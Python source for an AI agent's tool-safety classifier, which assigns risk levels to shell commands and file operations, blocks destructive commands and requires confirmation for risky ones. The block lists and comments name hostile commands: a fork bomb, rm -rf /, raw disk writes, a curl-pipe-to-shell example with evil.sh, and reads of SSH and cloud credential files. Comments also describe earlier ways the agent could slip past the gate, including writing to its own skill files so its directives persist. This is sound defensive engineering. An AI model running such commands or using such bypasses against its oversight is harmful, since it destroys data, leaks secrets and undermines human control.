    if not isinstance(raw, dict):
        return {}
    for head, value in raw.items():
        if not isinstance(head, str) or "/" in head or "=" in head:
            continue
        if value is True:
            out[head] = True
        elif isinstance(value, list) and all(isinstance(v, str) for v in value):
            out[head] = frozenset(value)
    return out


class ToolSafetyFramework:
    """
    Classifies tool operations by risk level.
    
    Based on research4.md Part 26: Tool Execution Safety.
    
    Risk Levels:
        SAFE - Read-only operations, auto-execute
        LOW - Minor changes, log and execute  
        MEDIUM - Moderate changes, warn user
        HIGH - Significant changes, require confirmation
        CRITICAL - Dangerous operations, block entirely
    """
    
    # Commands that are ALWAYS blocked - no exceptions
    # These are checked with word boundaries to avoid false positives
    BLOCKED_COMMANDS: Set[str] = {
        ":(){ :|:& };:",  # Fork bomb
    }
    
    # Patterns that are blocked (regex for precise matching)
    BLOCKED_PATTERNS = [
        re.compile(r"rm\s+(-[rf]+\s+)*/$"),  # rm -rf / exactly
        re.compile(r"rm\s+(-[rf]+\s+)*/\*"),  # rm -rf /*
        re.compile(r"mkfs\.\w+\s+/dev/[sh]d"),  # mkfs on real disk
        re.compile(r"dd\s+.*of=/dev/[sh]d[a-z]$"),  # dd to real disk (not partition)
        re.compile(r">\s*/dev/[sh]d[a-z]$"),  # redirect to disk
        re.compile(r"^(shutdown|reboot|halt|poweroff|init\s+[06])(\s|$)"),  # system power
    ]
    
    # Patterns for risk classification (checked in order)
    RULES: List[SafetyRule] = [
        # CRITICAL - System destruction
        SafetyRule(
            re.compile(r"rm\s+(-[rf]+\s+)*/(s|$)", re.IGNORECASE),
            RiskLevel.CRITICAL,
            "Recursive delete of root filesystem"
        ),
        SafetyRule(
            re.compile(r"mkfs\.", re.IGNORECASE),
            RiskLevel.CRITICAL,
            "Filesystem formatting"
        ),
        SafetyRule(
            re.compile(r"dd\s+.*of=/dev/[sh]d", re.IGNORECASE),
            RiskLevel.CRITICAL,
            "Direct disk write"
        ),
        SafetyRule(
            re.compile(r">\s*/dev/(sd|hd|nvme)", re.IGNORECASE),
            RiskLevel.CRITICAL,
            "Direct device write"
        ),
        
        # HIGH - Significant system changes
        SafetyRule(
            re.compile(r"rm\s+(-[rf]+\s+)+", re.IGNORECASE),
            RiskLevel.HIGH,
            "Recursive or forced delete"
        ),
        SafetyRule(
            re.compile(r"chmod\s+-R", re.IGNORECASE),
            RiskLevel.HIGH,
            "Recursive permission change"
        ),
        SafetyRule(
            re.compile(r"chown\s+-R", re.IGNORECASE),
            RiskLevel.HIGH,
            "Recursive ownership change"
        ),
        SafetyRule(
            re.compile(r"apt(-get)?\s+(install|remove|purge|autoremove)", re.IGNORECASE),
            RiskLevel.HIGH,
            "Package management"
        ),
        SafetyRule(
            re.compile(r"dnf\s+(install|remove|erase)", re.IGNORECASE),
            RiskLevel.HIGH,
            "Package management"
        ),
        SafetyRule(
            re.compile(r"yum\s+(install|remove|erase)", re.IGNORECASE),
            RiskLevel.HIGH,
            "Package management"
        ),
        SafetyRule(
            re.compile(r"pip\s+install", re.IGNORECASE),
            RiskLevel.HIGH,
            "Python package installation"
        ),
        SafetyRule(
            re.compile(r"npm\s+(install|uninstall)", re.IGNORECASE),
            RiskLevel.HIGH,
            "Node.js package management"
        ),
        SafetyRule(
            re.compile(r"systemctl\s+(start|stop|restart|enable|disable)", re.IGNORECASE),
            RiskLevel.HIGH,
            "Service management"
        ),
        SafetyRule(
            re.compile(r"service\s+\w+\s+(start|stop|restart)", re.IGNORECASE),
            RiskLevel.HIGH,
            "Service management"
        ),
        SafetyRule(
            re.compile(r"sudo\s+", re.IGNORECASE),
            RiskLevel.HIGH,
            "Elevated privileges"
        ),
        SafetyRule(
            re.compile(r"su\s+-", re.IGNORECASE),
            RiskLevel.HIGH,
            "User switching"
        ),
        
        # MEDIUM - Modifications
        SafetyRule(
            re.compile(r"mv\s+", re.IGNORECASE),
            RiskLevel.MEDIUM,
            "File move/rename"
        ),
        SafetyRule(
            re.compile(r"cp\s+", re.IGNORECASE),
            RiskLevel.MEDIUM,
            "File copy"
        ),
        SafetyRule(
            re.compile(r"rm\s+", re.IGNORECASE),
            RiskLevel.MEDIUM,
            "File deletion"
        ),
        SafetyRule(
            re.compile(r">\s*\S+", re.IGNORECASE),
            RiskLevel.MEDIUM,
            "File redirection/overwrite"
        ),
        SafetyRule(
            re.compile(r">>\s*\S+", re.IGNORECASE),
            RiskLevel.LOW,
            "File append"
        ),
        SafetyRule(
            re.compile(r"chmod\s+", re.IGNORECASE),
            RiskLevel.MEDIUM,
            "Permission change"
        ),
        SafetyRule(
            re.compile(r"chown\s+", re.IGNORECASE),
            RiskLevel.MEDIUM,
            "Ownership change"
        ),
        
        # LOW - Minor changes
        SafetyRule(
            re.compile(r"mkdir\s+", re.IGNORECASE),
            RiskLevel.LOW,
            "Directory creation"
        ),
        SafetyRule(
            re.compile(r"touch\s+", re.IGNORECASE),
            RiskLevel.LOW,
            "File creation/timestamp update"
        ),
        SafetyRule(
            re.compile(r"ln\s+", re.IGNORECASE),
            RiskLevel.LOW,
            "Link creation"
        ),
        
        # SAFE verdicts no longer come from this table. The nine prefix
        # regexes that lived here ("Directory listing", "System info", ...)
        # matched on the first two letters of a command, so `lsof`,
        # `filebeat` and `iptables -F` all classified SAFE. The read-only
        # lane is exact-name now: READ_ONLY_COMMANDS below, consulted by
        # _classify_command after the dangerous rules.
    ]
    
    # Paths that elevate risk.
    #
    # Expanded at import, not written with a tilde. `_classify_write` compares
    # with `startswith` and `in` against a real path, and a real path is always
    # expanded -- so a literal "~/.ssh/" entry matched nothing and read as
    # protection that was not there. Verified: a write to
    # $HOME/.config/halbert/skills/evil.md classified MEDIUM with no
    # confirmation, while the same path written with a tilde was HIGH.
    #
    # The skills directories are here because skill text is an instruction
    # source (lenses invariant 8): once the composed skill prompt reaches
    # messages[0], a model able to write here once would persist its own
    # directives across every later restart.
    SENSITIVE_PATHS: Set[str] = {_resolved_root(_p) for _p in (
        "/etc/",
        "/boot/",
        "/usr/",
        "/var/",
        "/root/",
        "/sys/",
        "/proc/",
        "/dev/",
        str(Path.home() / ".ssh") + "/",
        str(Path.home() / ".gnupg") + "/",
        str(Path.home() / ".config") + "/",
        # A17-G3 + A17 bug 2: Halbert's own config directory, wherever the
        # platform puts it. On macOS that is
        # ``~/Library/Application Support/Halbert`` -- which was NOT under
        # ``~/.config``, so the agent's own write_file to the real
        # ``mcp_config.yml`` classified MEDIUM (no confirmation) while the
        # same file written under a Linux-shaped path was HIGH. The MCP
        # health monitor relaunches a server whose config identity
        # changed within a tick, so an unconfirmed write there is an
        # unconfirmed arbitrary-command path. The data directory rides
        # along for the same reason: it holds the stores the agent's own
        # answers are read back out of.
        *_platform_sensitive_dirs(),
    )}
    
    def __init__(self, user_overrides: Optional[Dict[str, Union[bool, Set[str]]]] = None):
        """
        Initialize the safety framework.

        Args:
            user_overrides: Owner-vouched additions to the read-only lane,
                same shape as READ_ONLY_COMMANDS: ``{"head": True}`` vouches
                a whole binary, ``{"head": {"verb"}}`` vouches it for those
                first operands only. The persistent store is
                ``<config_dir>/command-allowlist.json`` (owner-authored; the
                "always allow this" queue a confirmation prompt drains into).
                None loads that store.
        """
        if user_overrides is None:
            loaded = load_user_command_overrides()
            self.user_overrides: Dict[str, Union[bool, FrozenSet[str]]] = dict(loaded)
        else:
            self.user_overrides = {
                str(k): (True if v is True else frozenset(v))
                for k, v in user_overrides.items()
            }
        self._skill_safety = None

    def set_skill_safety(self, safety) -> None:
        """Install the active skills' composed safety constraints.

        Skills contribute *rules*, not enforcement. Every tool call already
        passes through this classifier on its way to ToolExecutor and, for
        HIGH risk, to the approval flow — so skill constraints join that chain
        instead of standing up a parallel gate that a caller could bypass.

        Pass None to clear (skills are per-turn). Duck-typed on the four
        SkillSafety fields so tools/ need not import skills/.
        """
        self._skill_safety = safety

    def _check_skill_safety(self, tool_name: str, args: Dict) -> Optional[SafetyCheckResult]:
        """Classify against the active skills' constraints, if any match."""
        safety = self._skill_safety
        if safety is None:
            return None

        # A13 bug 6 (fix-first row 26): the composed allowlist is
        # ENFORCED. It was merged and warned about -- "all tools denied"
        # in the log -- and then every tool ran anyway. A skill that says
        # which tools it may use is stating a boundary, and a boundary
        # nothing checks is a sentence in a file.
        allowed = getattr(safety, "allowed_tools", None)
        if allowed is not None and tool_name not in allowed:
            named = ", ".join(sorted(allowed)) or "(none)"
            logger.warning(
                "BLOCKED by the active skills' tool allowlist: %s "
                "(permitted: %s)", tool_name, named)
            return SafetyCheckResult(
                risk_level=RiskLevel.CRITICAL,
                allowed=False,
                requires_confirmation=False,
                reason=(
                    f"The active skills permit only {named}; {tool_name} is "
                    f"not among them"
                ),
                matched_rule="skill.allowed_tools",
            )

        command = str(args.get("command", "") or "").strip()
        path = str(args.get("path", "") or "").strip()
        # The directory the command runs in is part of what it does:
        # `rm grub.cfg` with cwd=/boot is the same operation as
        # `cd /boot && rm grub.cfg`, and only the second was classified.
        cwd = str(args.get("cwd", "") or "").strip()
        segments = _command_segments(command) if command else []

        for pattern in getattr(safety, "blocked_commands", ()) or ():
            prefix = pattern.rstrip("*")
            anchored = any(seg.startswith(prefix) for seg in segments)
            if command and (fnmatch.fnmatch(command, pattern) or anchored):
                logger.warning("BLOCKED by active skill: %s (pattern %s)", command, pattern)
                return SafetyCheckResult(
                    risk_level=RiskLevel.CRITICAL,
                    allowed=False,
                    requires_confirmation=False,
                    reason=f"Blocked by an active skill: matches {pattern!r}",
                    matched_rule="skill.blocked_commands",
                )

        needs_approval = bool(getattr(safety, "destructive_requires_approval", False))

        # A13 bug 5 (fix-first row 26): the comparison was against the RAW
        # argument. ``write_file path=/./tank/data/x``, a relative path, or
        # a symlink alias all missed a skill-declared protected path --
        # and unlike the base classifier's SENSITIVE_PATHS (whose
        # substring test happens to cover /boot), a skill declares paths
        # nothing else guards. Normalised on both sides before comparing.
        normalised_path = _normalise_path(path)
        normalised_cwd = _normalise_path(cwd)
        for raw_pattern in getattr(safety, "protected_paths", ()) or ():
            pattern = raw_pattern
            norm_pattern = _normalise_path(str(raw_pattern).rstrip("*"))
            # The bare ``startswith(pattern.rstrip("*"))`` that used to
            # be here is gone: it made ``/opt/bootleg`` match a rule about
            # ``/opt/boot``, which is the over-match half of A13 bug 5.
            # ``_within_path`` is segment-aware, and an operator who
            # means "everything under here" writes the glob.
            hit = bool(path and (
                fnmatch.fnmatch(path, pattern)
                or (normalised_path and norm_pattern
                    and _within_path(normalised_path, norm_pattern))
            ))
            if not hit and cwd:
                hit = bool(
                    fnmatch.fnmatch(cwd, pattern)
                    or (normalised_cwd and norm_pattern
                        and _within_path(normalised_cwd, norm_pattern))
                )
            if not hit and command:
                hit = fnmatch.fnmatch(command, f"*{pattern}*") or pattern.rstrip("/*") in command
            if hit:
                return SafetyCheckResult(
                    risk_level=RiskLevel.HIGH,
                    allowed=True,
                    requires_confirmation=True,
                    reason=f"An active skill protects {pattern}",
                    matched_rule="skill.protected_paths",
                )

        if command and needs_approval:
            for service in getattr(safety, "protected_services", ()) or ():
                if service in command and any(
                    verb in command for verb in ("stop", "disable", "mask", "kill", "restart")
                ):
                    return SafetyCheckResult(
                        risk_level=RiskLevel.HIGH,
                        allowed=True,
                        requires_confirmation=True,
                        reason=f"An active skill protects the {service} service",
                        matched_rule="skill.protected_services",
                    )

        return None

    def classify(self, tool_name: str, args: Dict) -> SafetyCheckResult:
        """
        Classify risk level for a tool call.

        Args:
            tool_name: Name of the tool
            args: Tool arguments

        Returns:
            SafetyCheckResult with risk level and policy

        When active skills declare safety constraints, the stricter of the
        built-in classification and the skill classification wins. Skills can
        only tighten: a skill cannot make a CRITICAL built-in command safe.
        """
        base = self._classify_builtin(tool_name, args)
        from_skill = self._check_skill_safety(tool_name, args)
        if from_skill is None:
            return base
        if _RISK_ORDER[from_skill.risk_level.value] > _RISK_ORDER[base.risk_level.value]:
            return from_skill
        return base

    def _classify_builtin(self, tool_name: str, args: Dict) -> SafetyCheckResult:
        """The framework's own classification, before skill constraints."""
        if tool_name == "run_command":
            # The directory the command runs in is part of what it does:
            # `rm grub.cfg` with cwd=/boot is the same operation as
            # `cd /boot && rm grub.cfg`, and only the second was classified.
            return self._classify_command(args.get("command", ""), args.get("cwd"))
        elif tool_name in ("write_file", "write_config"):
            return self._classify_write(args.get("path", ""))
        elif tool_name in ("read_file", "cat", "read_config"):
            # "Read-only" is a statement about the filesystem, not about harm.
            # This branch returned SAFE for every path, so `read_file` on
            # /etc/shadow, ~/.ssh/id_ed25519 or ~/.aws/credentials auto-executed
            # with no confirmation and no warning. Exfiltrating a key is a read.
            secret = _secret_read(args.get("path", ""))
            if secret:
                return SafetyCheckResult(
                    risk_level=RiskLevel.HIGH,
                    allowed=True,
                    requires_confirmation=True,
                    reason=f"Reads a credential: {secret}",
                    matched_rule="SECRET_FILENAMES",
                )
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Read-only operation"
            )
        elif tool_name in ("search", "search_discoveries"):
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Search operation"
            )
        elif tool_name == "recall_memory":
            # Its own branch, and it must stay SAFE. Falling through to the
            # unknown-tool default would make it MEDIUM, and RoleGate caps a
            # restricted speaker at low — which would block a read-only
            # ledger query for exactly the speakers least able to work
            # around it, silently, in any test using the default role.
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Read-only recall from the change ledger"
            )
        elif tool_name == "web_search":
            # Egress, not a local read: the query text leaves the machine.
            # MEDIUM executes without confirmation (the switch — CAP_WEB,
            # off by default — is what gates it), but it is no longer
            # SAFE, so it is audited and visible like any other
            # side-effecting tool (C3-08).
            return SafetyCheckResult(
                risk_level=RiskLevel.MEDIUM,
                allowed=True,
                requires_confirmation=False,
                reason="Web search: the query text leaves the machine (network egress)"
            )
        elif tool_name == "terminal_blocks":
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Read-only terminal block fetch"
            )
        elif tool_name == "execute_code":
            # In-process Python, so its own power is that of any code this
            # process runs (F-1(a) accepted that honestly). What keeps it at
            # MEDIUM — audited, visible, no confirmation — is that its tool
            # work is NOT a bypass: stub calls dispatch through execute()
            # with the full per-call pipeline, the stub surface is read-only
            # by default, and the script text passes the deterministic
            # subprocess/os.system gate first.
            return SafetyCheckResult(
                risk_level=RiskLevel.MEDIUM,
                allowed=True,
                requires_confirmation=False,
                reason=(
                    "In-process script run; tool calls inside it go through "
                    "the standard per-call policy pipeline"
                ),
            )
        elif tool_name in THREAD_META_TOOLS:
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Conversation thread operation (handled inline)"
            )
        elif tool_name in (
            "capture_screenshot", "capture_webcam",
            "capture_and_ocr", "list_windows", "capture_window",
            "capture_active_window",
        ):
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Local vision capture (read-only)"
            )
        elif tool_name in ("run_applescript", "run_jxa"):
            # A2: AppleScript/JXA scripts classify by script CONTENT — one
            # script is the whole machine (Finder deletes, Mail sends, `do
            # shell script` runs shell). This branch takes precedence over
            # the unknown-tool MEDIUM default below: the founder ruling is
            # HIGH for anything not positively identified as read-only
            # (see tools/applescript_safety.py).
            from .applescript_safety import classify_applescript_tool
            return classify_applescript_tool(tool_name, args)
        elif tool_name.startswith("mcp__"):
            # B3: MCP tools are remote — there is no local text to
            # pattern-match (the shell-command rules above read command
            # text; a `tools/call` payload says nothing about what the
            # server does with it). Classification comes from config
            # overrides (per-tool `tool_risk` > per-server
            # `risk_override`, mcp_config.yml), re-read on EVERY call so
            # a config flip gates the next call, with an explicit MEDIUM
            # default (execute with warning). Lazy import for the same
            # cycle-shape reason as the applescript branch above
            # (mcp.config imports this module for RiskLevel).
            from .mcp_safety import classify_mcp_tool
            return classify_mcp_tool(tool_name, args)
        else:
            # Unknown tools get MEDIUM by default
            return SafetyCheckResult(
                risk_level=RiskLevel.MEDIUM,
                allowed=True,
                requires_confirmation=False,
                reason=f"Unknown tool: {tool_name}"
            )
    

    @staticmethod
    def _shell_segments(command: str) -> "Optional[List[str]]":
        """Alias of the module-level ``split_shell_command``.

        One scanner, one truth: the read-only verdict and the path analysis
        used to be computed from different tokenisations of the same string,
        which is exactly how the quoting bypass (a pair of quotes skipping
        the credential tier) existed.
        """
        return split_shell_command(command)

    def _is_read_only_segment(
        self, segment: str, tables: tuple = (READ_ONLY_COMMANDS,)
    ) -> bool:
        """True when this one command only observes the host.

        The verdict is exact-name, bare-name only:

        * ``/tmp/evil/ls`` is not vouched. The invite-only check the audit
          calls arbitrary root execution in ``halbert-exec-helper`` was a
          basename lookup; matching ``tokens[0].rsplit('/', 1)[-1]`` would be
          the same bug one layer up. A slash in argv[0] ends the lane.
        * ``FOO=bar ls`` and ``sudo ls`` are not vouched. A leading
          VAR=value is a program-behaviour override (``LD_PRELOAD``,
          ``LESSOPEN`` are the class), and wrappers run something else under
          an altered environment; the dangerous-rules pass already saw them.
        * Pager-hosts (``man``/``less``/``more``) are absent from the table:
          a vouched binary whose arguments (``man -P``) or environment
          (``LESSOPEN``) select a program is not read-only.
        """
        tokens = _segment_tokens(segment)
        if not tokens:
            return False
        head = tokens[0]
        if "/" in head or "=" in head or head in _WRAPPER_HEADS:
            return False
        args = tokens[1:]
        effectful = EFFECTFUL_ARGS.get(head, ())
        if any(a in effectful or a.partition("=")[0] in effectful for a in args):
            return False
        allowed: Optional[Union[bool, FrozenSet[str]]] = tables[0].get(head)
        if allowed is None and len(tables) > 1:
            # The owner may vouch a command the table does not know --
            # keyed on (binary, first operand), so "always allow
            # `systemctl restart`" never becomes "always allow systemctl".
            allowed = tables[1].get(head)
        if allowed is None:
            return False
        if allowed is True:
            return True
        # A frozenset: skip flags this binary may inertly lead with, then the
        # first operand must be one of the vouched verbs. Some binaries spell
        # the verb AS a flag (iptables -L): an unskippable flag that is itself
        # a vouched verb is the operand.
        flags = INERT_LEADING_FLAGS.get(head, {})
        i = 0
        while i < len(args) and args[i].startswith("-"):
            name, eq, _val = args[i].partition("=")
            if name in allowed:
                break
            takes_value = flags.get(name)
            if takes_value is None:
                return False
            if takes_value and not eq:
                i += 1  # the value token follows separately
            i += 1
        if i >= len(args):
            return True  # only inert flags: `systemctl --user` prints usage
        operand = args[i].partition("=")[0]
        if operand not in allowed:
            # `date +%Y-%m-%d`: a format spec is an output shape, not a verb.
            # Spelled as a literal "+" member of that binary's frozenset so
            # no other command gains the exemption by accident.
            if not (args[i].startswith("+") and "+" in allowed):
                return False
        sub = SUBVERBS.get(head, {}).get(operand)
        if sub is not None and i + 1 < len(args):
            return args[i + 1].partition("=")[0] in sub
        return True

    def _owner_vouched(self, command: str) -> bool:
        """True when every segment is on the owner's own allowlist.

        Consulted between the CRITICAL rules (which no store overrides) and
        the HIGH rules (which it must -- this exists so "always allow
        `systemctl restart`" retires a prompt the built-in tables would
        otherwise raise forever).
        """
        if not self.user_overrides or _has_unquoted_redirect(command):
            return False
        segments = split_shell_command(command)
        if not segments:
            return False
        return all(
            self._is_read_only_segment(s, tables=({}, self.user_overrides))
            for s in segments
        )

    def _every_segment_is_read_only(self, command: str) -> bool:
        """True only when every command on the line is a read-only invocation.

        A line beginning with a benign command used to be classified on that
        command alone: ``ls && curl https://evil.sh | sh`` was SAFE,
        "Directory listing", no confirmation. An unquoted redirection is
        disqualifying outright -- ``ls > /etc/passwd`` reads as an ``ls`` --
        while a quoted one (``grep 'a > b' /etc/hosts``) is not a redirect.
        """
        if _has_unquoted_redirect(command):
            return False
        segments = split_shell_command(command)
        if not segments:
            return False
        return all(
            self._is_read_only_segment(s, tables=(READ_ONLY_COMMANDS,))
            for s in segments
        )

    def _classify_command(self, command: str, cwd: Optional[str] = None) -> SafetyCheckResult:
        """Classify a shell command.

        Order is load-bearing: blocked and HIGH/CRITICAL rules run before the
        read-only lane so `sudo cat /etc/hosts` stays HIGH rather than being
        read as a `cat`; the credential check runs before the lane so
        `cat ~/.ssh/id_ed25519` is not a file read.

        The default changed from MEDIUM (run silently) to HIGH (ask). That is
        the whole direction of SEC-2: an unrecognised command is not a
        severity claim, it is the classifier declining to vouch -- which is
        what confirmation is for. The measured cost on Halbert's own
        repertoire is ~11% prompts, drainable through the owner's
        command-allowlist store.
        """
        command = command.strip()
        if not command:
            # run_command with no command runs nothing. (The voice auth gate
            # classifies an empty args dict; a HIGH here would *refuse* guest
            # and restricted speakers on the voice path outright -- the gate
            # blocking a command that does not exist.)
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="No command to run"
            )

        # Check blocked commands first (exact matches)
        for blocked in self.BLOCKED_COMMANDS:
            if blocked in command:
                logger.warning(f"BLOCKED command: {command}")
                return SafetyCheckResult(
                    risk_level=RiskLevel.CRITICAL,
                    allowed=False,
                    requires_confirmation=False,
                    reason=f"Blocked command pattern: {blocked}",
                    matched_rule="BLOCKED_COMMANDS"
                )

        # Check blocked patterns (regex)
        for pattern in self.BLOCKED_PATTERNS:
            if pattern.search(command):
                logger.warning(f"BLOCKED command: {command}")
                return SafetyCheckResult(
                    risk_level=RiskLevel.CRITICAL,
                    allowed=False,
                    requires_confirmation=False,
                    reason="Blocked command pattern",
                    matched_rule=pattern.pattern
                )

        # A credential read outranks every verdict below, including the
        # read-only lane. Quote-tolerant by construction: a model writes
        # `cat "/Users/me/.ssh/id_ed25519"` about as often as the bare form.
        secret = _command_reads_secret(command)
        if secret:
            return SafetyCheckResult(
                risk_level=RiskLevel.HIGH,
                allowed=True,
                requires_confirmation=True,
                reason=f"Reads a credential: {secret}",
                matched_rule="SECRET_FILENAMES",
            )

        paths = _paths_touched(command, cwd)

        def elevate(risk: RiskLevel) -> RiskLevel:
            """Bump one notch when the line names a path the owner watches.

            One notch only, on purpose: SAFE `ls ~/.config` lands at LOW and
            still runs; the guard is an *elevator*, not a second gate, and
            the credential FILE names above are where the real gate lives.
            """
            for sensitive in self.SENSITIVE_PATHS:
                if any(_within_path(p, sensitive) for p in paths):
                    return {
                        RiskLevel.SAFE: RiskLevel.LOW,
                        RiskLevel.LOW: RiskLevel.MEDIUM,
                        RiskLevel.MEDIUM: RiskLevel.HIGH,
                    }.get(risk, risk)
            return risk

        # CRITICAL rules search the whole line, so a chained `rm -rf` after a
        # benign command is still seen. Nothing below this point may silence
        # them — least of all the owner's own allowlist store.
        for rule in self.RULES:
            if rule.risk_level != RiskLevel.CRITICAL:
                continue
            if rule.pattern.search(command):
                return SafetyCheckResult(
                    risk_level=rule.risk_level,
                    allowed=False,
                    requires_confirmation=False,
                    reason=rule.reason,
                    matched_rule=rule.pattern.pattern
                )

        # The owner's "always allow this" store outranks a HIGH rule but never
        # a CRITICAL one: `systemctl restart nginx` can be retired; `dd
        # of=/dev/sda` cannot.
        if self._owner_vouched(command):
            return SafetyCheckResult(
                risk_level=RiskLevel.SAFE,
                allowed=True,
                requires_confirmation=False,
                reason="Owner-allowlisted invocation",
                matched_rule="owner_allowlist"
            )

        for rule in self.RULES:
            if rule.risk_level != RiskLevel.HIGH:
                continue
            if rule.pattern.search(command):
                return SafetyCheckResult(
                    risk_level=rule.risk_level,
                    allowed=True,
                    requires_confirmation=True,
                    reason=rule.reason,
                    matched_rule=rule.pattern.pattern
                )

        if self._every_segment_is_read_only(command):
            risk = elevate(RiskLevel.SAFE)
            return SafetyCheckResult(
                risk_level=risk,
                allowed=True,
                requires_confirmation=risk == RiskLevel.HIGH,
                reason="Read-only invocation",
                matched_rule="READ_ONLY_COMMANDS"
            )

        for rule in self.RULES:
            if rule.risk_level in (RiskLevel.CRITICAL, RiskLevel.HIGH):
                continue
            if rule.pattern.search(command):
                risk = elevate(rule.risk_level)
                return SafetyCheckResult(
                    risk_level=risk,
                    allowed=True,
                    requires_confirmation=risk == RiskLevel.HIGH,
                    reason=rule.reason,
                    matched_rule=rule.pattern.pattern
                )

        # Nothing recognised the line. That is not a severity claim -- it is
        # the classifier declining to vouch, which is what confirmation is
        # for. The old default ran it: a command no rule matched executed
        # silently at MEDIUM, so every gap in the table was an open door.
        return SafetyCheckResult(
            risk_level=RiskLevel.HIGH,
            allowed=True,
            requires_confirmation=True,
            reason="Unrecognised command: not on the read-only list",
            matched_rule="default"
        )

    def _classify_write(self, path: str) -> SafetyCheckResult:
        """Classify a file write operation.

        The path is normalised first: the handler expands ``~`` before it
        opens the file, so a gate that reads the raw argument is gating a
        different string than the one that gets written.
        """
        resolved = _normalise_path(path) or path
        secret = _secret_read(resolved)
        if secret:
            return SafetyCheckResult(
                risk_level=RiskLevel.HIGH,
                allowed=True,
                requires_confirmation=True,
                reason=f"Writes a credential-shaped file: {secret}"
            )
        for sensitive in self.SENSITIVE_PATHS:
            if _within_path(resolved, sensitive):
                return SafetyCheckResult(
                    risk_level=RiskLevel.HIGH,
                    allowed=True,
                    requires_confirmation=True,
                    reason=f"Write to sensitive path: {sensitive}"
                )

        return SafetyCheckResult(
            risk_level=RiskLevel.MEDIUM,
            allowed=True,
            requires_confirmation=False,
            reason="File write operation"
        )

    def get_confirmation_message(
        self,
        tool_name: str,
        args: Dict,
        result: SafetyCheckResult
    ) -> str:
        """
        Generate a human-readable confirmation message.
        
        Args:
            tool_name: Name of the tool
            args: Tool arguments
            result: SafetyCheckResult from classify()
            
        Returns:
            Confirmation message string
        """
        if tool_name == "run_command":
            cmd = args.get("command", "")
            return (
                f"**Execute command:**\n"
                f"```\n{cmd}\n```\n\n"
                f"**Risk Level:** {result.risk_level.value.upper()}\n"
                f"**Reason:** {result.reason}"
            )
        elif tool_name in ("run_applescript", "run_jxa"):
            # A2: the script IS the action, so show it — the speaker
            # confirms what will actually run, not a summary. A PREVIEW,
            # not the whole script (same shape as write_file's content
            # preview): an oversized script must not flood the
            # confirmation surface with megabytes. Non-dict args are
            # tolerated (the executor's HIGH branch calls this
            # un-wrapped), mirroring classify_applescript_tool's guard.
            script = args.get("script", "") if isinstance(args, dict) else ""
            label = "AppleScript (JXA)" if tool_name == "run_jxa" else "AppleScript"
            preview = script[:1000]
            omitted = ""
            if len(script) > 1000:
                omitted = f"\n… ({len(script)} characters total; truncated)"
            return (
                f"**Run {label}:**\n"
                f"```\n{preview}\n```\n{omitted}\n\n"
                f"**Risk Level:** {result.risk_level.value.upper()}\n"
                f"**Reason:** {result.reason}"
            )
        elif tool_name.startswith("mcp__"):
            # B3: the analog of the applescript branch showing the
            # script — show what the call actually is: the SERVER, the
            # TOOL, and a capped preview of the ARGS (the args are what
            # the remote server receives, and they can be arbitrarily
            # large; the confirmation surface must not flood). Non-dict
            # args tolerated, mirroring the applescript branch's guard.
            from .mcp_safety import describe_mcp_tool, mcp_args_preview
            server, tool = describe_mcp_tool(tool_name)
            return (
                f"**MCP tool:** `{server}` → `{tool}`\n\n"
                f"**Args preview:**\n"
                f"```\n{mcp_args_preview(args)}\n```\n\n"
                f"**Risk Level:** {result.risk_level.value.upper()}\n"
                f"**Reason:** {result.reason}"
            )
        elif tool_name in ("write_file", "write_config"):
            path = args.get("path", "")
            content_preview = args.get("content", "")[:200]
            return (
                f"**Write to file:** `{path}`\n\n"
                f"**Content preview:**\n"
                f"```\n{content_preview}...\n```\n\n"
                f"**Risk Level:** {result.risk_level.value.upper()}\n"
                f"**Reason:** {result.reason}"
            )
        else:
            return (
                f"**Execute:** {tool_name}\n"
                f"**Args:** {args}\n\n"
                f"**Risk Level:** {result.risk_level.value.upper()}\n"
                f"**Reason:** {result.reason}"
            )
